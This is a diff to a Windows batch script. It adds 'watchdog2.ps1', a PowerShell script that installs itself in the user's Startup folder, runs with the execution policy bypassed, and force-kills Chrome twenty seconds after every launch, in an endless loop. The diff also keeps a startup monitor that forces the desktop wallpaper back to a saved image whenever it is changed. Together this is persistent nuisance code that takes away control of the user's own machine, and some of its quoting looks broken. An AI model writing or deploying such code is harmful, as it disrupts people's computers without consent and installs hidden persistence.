@@ -1,93 +1,82 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Check for administrative privileges
-net session >nul 2>&1
-if %errorLevel% NEQ 0 (
-    echo This script requires administrative privileges. Please run as administrator.
-    pause
-    exit /b
-)
-
-:: Ask for image path
-set /p "imgPath=Enter the full path of the image to set as wallpaper: "
-
-:: Check if file exists
-if not exist "%imgPath%" (
-    echo File does not exist!
-    pause
-    exit /b
-)
-
-:: Save path to file for persistence
-set "saveFile=%APPDATA%\savedWallpaperPath.txt"
-echo %imgPath%>"%saveFile%"
-
-:: Set wallpaper via registry
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imgPath%" /f >nul
-
-:: Notify system of environment change via PowerShell
-powershell.exe -NoProfile -Command ^
-"Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class NativeMethods {
-    [DllImport(\"user32.dll\", SetLastError = true)]
-    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-}
-'@; ^
-[NativeMethods]::SystemParametersInfo(20, 0, '%imgPath%', 3)"
-
-:: Overwrite TranscodedWallpaper file
-set "appdataPath=%APPDATA%\Microsoft\Windows\Themes"
-if exist "%appdataPath%\TranscodedWallpaper" (
-    copy /y "%imgPath%" "%appdataPath%\TranscodedWallpaper" >nul
-)
-
-:: Restart explorer to apply changes
-taskkill /f /im explorer.exe >nul 2>&1
-timeout /t 2 >nul
-start explorer.exe
-
-:: Create PowerShell script to monitor wallpaper changes
-set "psScriptPath=%APPDATA%\monitorWallpaper.ps1"
+:: Deploy watchdog2.ps1
+set "watchdogPath=%APPDATA%\watchdog2.ps1"
 (
-    echo $savedPath = Get-Content "%saveFile%"
-    echo $checkInterval = 5
-    echo function Set-Wallpaper($path) {
-    echo     Add-Type @"
-    echo using System;
-    echo using System.Runtime.InteropServices;
-    echo public class NativeMethods {
-    echo     [DllImport("user32.dll", SetLastError = true)]
-    echo     public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    echo }
-"@
-    echo     [NativeMethods]::SystemParametersInfo(20, 0, $path, 3) ^| Out-Null
+    echo ^# watchdog2.ps1 - Monitor and kill chrome.exe after 20 seconds
+    echo $scriptPath = $MyInvocation.MyCommand.Path
+    echo $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\watchdog2.bat"
+    echo if (!(Test-Path $startupPath)) {
+    echo     "@echo off
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"^"$scriptPath^"`"" ^| Out-File -Encoding ASCII $startupPath
     echo }
     echo while ($true) {
-    echo     $currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
-    echo     if ($currentWallpaper -ne $savedPath) {
-    echo         Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $savedPath
-    echo         Set-Wallpaper $savedPath
-    echo         Write-Host 'Wallpaper reset to saved image'
+    echo     $chrome = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
+    echo     if ($chrome) {
+    echo         Write-Host "Chrome detected. Waiting 20 seconds before terminating..."
+    echo         Start-Sleep -Seconds 20
+    echo         try {
+    echo             Get-Process -Name "chrome" -ErrorAction SilentlyContinue ^| Stop-Process -Force
+    echo             Write-Host "Chrome terminated."
+    echo         } catch {
+    echo             Write-Host "Failed to terminate Chrome: $_"
+    echo         }
     echo     }
-    echo     Start-Sleep -Seconds $checkInterval
+    echo     Start-Sleep -Seconds 5
     echo }
-) > "%psScriptPath%"
+) > "%watchdogPath%"
 
-:: Create batch script to run the PowerShell monitor at startup
-set "startupScript=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runMonitor.bat"
-(
-    echo @echo off
-    echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%psScriptPath%"
-) > "%startupScript%"
+:: Optionally: launch watchdog2 immediately
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%watchdogPath%" &
+
+:: Deploy or confirm other wallpaper monitor scripts
+if exist "%APPDATA%\monitorWallpaper.ps1" (
+    echo Wallpaper monitor script already exists.
+) else (
+    echo Creating default monitorWallpaper.ps1...
+    set "psScriptPath=%APPDATA%\monitorWallpaper.ps1"
+    (
+        echo $savedPath = Get-Content "%APPDATA%\savedWallpaperPath.txt"
+        echo $checkInterval = 5
+        echo function Set-Wallpaper($path) {
+        echo     Add-Type @"
+        echo using System;
+        echo using System.Runtime.InteropServices;
+        echo public class NativeMethods {
+        echo     [DllImport("user32.dll", SetLastError = true)]
+        echo     public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+        echo }
+"@
+        echo     [NativeMethods]::SystemParametersInfo(20, 0, $path, 3) ^| Out-Null
+        echo }
+        echo while ($true) {
+        echo     $currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
+        echo     if ($currentWallpaper -ne $savedPath) {
+        echo         Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $savedPath
+        echo         Set-Wallpaper $savedPath
+        echo         Write-Host 'Wallpaper reset to saved image'
+        echo     }
+        echo     Start-Sleep -Seconds $checkInterval
+        echo }
+    ) > "%psScriptPath%"
+)
+
+:: Ensure wallpaper monitor runs at startup
+set "startupMonitor=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runMonitor.bat"
+if not exist "%startupMonitor%" (
+    (
+        echo @echo off
+        echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%psScriptPath%"
+    ) > "%startupMonitor%"
+)
 
 echo.
-echo Wallpaper set via Registry and PowerShell.
-echo Persistent monitoring script created at startup.
-echo The wallpaper will be automatically reset if changed.
+echo Watchdog2 and Wallpaper monitor deployed.
+echo Watchdog2 will monitor and close Chrome after 20 seconds.
+echo Wallpaper monitor ensures persistent wallpaper.
 echo.
 pause
 exit /b
+
 
